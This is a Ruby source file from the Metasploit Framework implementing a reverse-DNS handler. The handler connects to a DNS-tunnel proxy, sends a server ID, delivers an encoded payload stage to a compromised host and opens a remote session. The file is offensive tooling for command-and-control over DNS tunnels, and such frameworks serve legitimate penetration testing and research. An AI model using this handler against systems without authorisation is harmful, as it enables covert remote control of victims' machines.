# -*- coding: binary -*-
module Msf
  module Handler

    ###
    #
    # This module implements the reverse DNS handler.  This means that
    # it will attempt to connect to a remote DNS-Proxy host on a given port for a period of
    # time (typically the duration of an exploit) to see if a the payload has
    # started listening.  This can tend to be rather verbose in terms of traffic
    # and in general it is preferable to use reverse payloads.
    #
    # Authors: Alexey Sintsov, Maxim Andreyanov
    #
    #
    ###
    module ReverseDns

      include Msf::Handler

      #
      # Returns the handler specific string representation, in this case
      # 'reverse_dns'.
      #
      def self.handler_type
        return "reverse_dns"
      end

      #
      # Returns the connection oriented general handler type, in this case bind.
      #
      def self.general_handler_type
        "bind"
      end

      #
      # Initializes a bind handler and adds the options common to all bind
      # payloads, such as local port.
      #
      def initialize(info = {})
        super

        register_options(
                [
                        Opt::LPORT(4444),
                        OptString.new('DOMAIN', [true, 'DOMAIN', '']),
                        OptString.new('SERVER_ID', [true, 'SERVER ID', 'toor']),
                        OptEnum.new('REQ_TYPE', [true, 'Type of DNS tunnel', 'DNSKEY', ['IPv6', 'DNSKEY']]),
                        OptAddress.new('RHOST', [true, 'DNX PROXY IP', '']),
                        OptAddress.new('NS_IP', [false, 'NS SERVER IP', '']),

                ], Msf::Handler::ReverseDns)

        self.conn_threads     = []
        self.listener_threads = []
        self.listener_pairs   = {}
        self.conn_queue       = ::Queue.new
      end

      #
      # Kills off the connection threads if there are any hanging around.
      #
      def cleanup_handler
        # Kill any remaining handle_connection threads that might
        # be hanging around
        conn_threads.each { |thr|
          thr.kill
        }
      end

      #
      # Starts a new connecting thread
      #
      def add_handler(opts = {})

        # Merge the updated datastore values
        opts.each_pair do |k, v|
          datastore[k] = v
        end

        # Start a new handler
        start_handler
      end

      #
      # Starts monitoring for an outbound connection to become established.
      #
      def start_handler
        # Maximum number of seconds to run the handler
        ctimeout = 10
        if (exploit_config and exploit_config['active_timeout'])
          ctimeout = exploit_config['active_timeout'].to_i
        end

        # Take a copy of the datastore options
        rhost     = datastore['RHOST']
        lport     = datastore['LPORT']
        server_id = datastore['SERVER_ID']
        req_type  = datastore['REQ_TYPE']

        # Ignore this if one of the required options is missing
        return if not rhost
        return if not lport
        return if not server_id
        return if not req_type

        # Only try the same host/port combination once
        phash = rhost + ':' + lport.to_s
        return if self.listener_pairs[phash]
        self.listener_pairs[phash] = true

        # Start a new handling thread
        self.listener_threads << framework.threads.spawn("BindTcpHandlerListener-#{lport}", false, self.conn_queue) { |lqueue|

          print_status("Started bind-DNS handler")

          if (rhost == nil)
            raise ArgumentError, "RHOST is not defined; bind stager cannot function.", caller
          end

          need_stage      = true
          need_connection = true
          loop do
            stime = Time.now.to_i
            if (need_connection == true)
              while (stime + ctimeout > Time.now.to_i)
                begin
                  client = nil
                  client = Rex::Socket::Tcp.create(
                          'PeerHost' => rhost,
                          'PeerPort' => lport.to_i,
                          'Proxies'  => datastore['Proxies'],
                          'Context'  =>
                                  {
                                          'Msf'        => framework,
                                          'MsfPayload' => self,
                                          'MsfExploit' => assoc_exploit
                                  })
                rescue Rex::ConnectionRefused
                  # Connection refused is a-okay

                rescue ::Exception
                  wlog("Exception caught in dns-bind handler: #{$!.class} #{$!}")
                end

                break if client

                # Wait a second before trying again
                Rex::ThreadSafe.sleep(0.5)
              end

              # Valid client connection?
              if (client)
                need_connection = false
                lqueue.push(client)

                # Increment the has connection counter
                self.pending_connections += 1

                # Timeout and datastore options need to be passed through to the client
                opts = {
                        :datastore       => datastore,
                        :expiration      => datastore['SessionExpirationTimeout'].to_i,
                        :comm_timeout    => 60 * 60 * 24,
                        :retry_total     => datastore['SessionRetryTotal'].to_i,
                        :retry_wait      => datastore['SessionRetryWait'].to_i,
                        :timeout         => 60 * 20,
                        :send_keepalives => false
                }

                # Start a new thread and pass the client connection
                # as the input and output pipe.  Client's are expected
                # to implement the Stream interface.
                conn_threads << framework.threads.spawn("BindDnsHandlerSession", false, client, lqueue) { |client_copy, lqueue|
                  begin

                    nosess = false
                    #SEND our SERVER_ID to the DNS
                    client_copy.put([server_id.length].pack("C") + server_id)
                    conn = client_copy

                    #First connect,  stage is needed? (or it not the first session and stage alredy there..
                    #    or it is a stageless payload)
                    if (need_stage == true and self.payload_type != Msf::Payload::Type::Single)
                      if respond_to? :include_send_uuid
                        if include_send_uuid
                          uuid_raw = conn.get_once(16, 1)
                          if uuid_raw
                            opts[:uuid] = Msf::Payload::UUID.new({ raw: uuid_raw })
                          end
                        end
                      end
                      p = generate_stage(opts)
                      # Encode the stage if stage encoding is enabled
                      begin
                        p = encode_stage(p)
                      rescue ::RuntimeError
                        warning_msg = "Failed to stage"
                        warning_msg << " (#{conn.peerhost})" if conn.respond_to? :peerhost
                        warning_msg << ": #{$!}"
                        print_warning warning_msg
                        if conn.respond_to? :close && !conn.closed?
                          conn.close
                        end
                        nosess = true
                      end

                      # Give derived classes an opportunity to an intermediate state before
                      # the stage is sent.  This gives derived classes an opportunity to
                      # augment the stage and the process through which it is read on the
                      # remote machine.
                      #
                      # If we don't use an intermediate stage, then we need to prepend the
                      # stage prefix, such as a tag
                      if handle_intermediate_stage(conn, p) == false
                        p = (self.stage_prefix || '') + p
                      end

                      sending_msg = "Sending #{encode_stage? ? "encoded " : ""}stage"
                      sending_msg << " (#{p.length} bytes)"
                      # The connection should always have a peerhost (even if it's a
                      # tunnel), but if it doesn't, erroring out here means losing the
                      # session, so make sure it does, just to be safe.
                      if conn.respond_to? :peerhost
                        sending_msg << " to #{conn.peerhost}"
                      end
                      print_status(sending_msg)

                      # Send the stage
                      conn.put(p)
                      need_stage = false
                    end

                    # Session waiting #LOGIC IS HERE777#
                    loop do
                      Rex::ThreadSafe.sleep(1)

                      begin
                        conn.put("?")
                        answer = conn.read(1)
                      rescue ::Exception
                        wlog("Exception caught during waiting of session : #{$!.class} #{$!}")
                        need_connection = true
                        nosess          = true
                        break
                      end

                      if answer == "\x01"
                        break
                      end

                    end

                    Rex::ThreadSafe.sleep(0.5)

                    #Start the session
                    if nosess == false
                      tmp_conn        = lqueue.pop # now this socket will be handled by session
                      need_connection = true
                      handle_connection(conn, opts)
                      self.send_keepalives = false
                    end

                  rescue
                    elog("Exception raised from BindDns.handle_connection: #{$!}")
                  end
                }
                Rex::ThreadSafe.sleep(5)
              else
                wlog("No connection received before the handler completed")
              end
            else
              Rex::ThreadSafe.sleep(5)
            end
          end
        }
      end

      #
      # Nothing to speak of.
      #
      def stop_handler
        # Stop the listener threads
        self.listener_threads.each do |t|
          t.kill
        end

        loop do
          if self.conn_queue.empty?
            break
          else
            conn = self.conn_queue.pop
            conn.close
          end
        end

        self.conn_queue.clear
        self.listener_threads = []
        self.listener_pairs   = {}
      end

      protected

      attr_accessor :conn_queue # :nodoc:
      attr_accessor :conn_threads # :nodoc:
      attr_accessor :listener_threads # :nodoc:
      attr_accessor :listener_pairs # :nodoc:
    end

  end
end

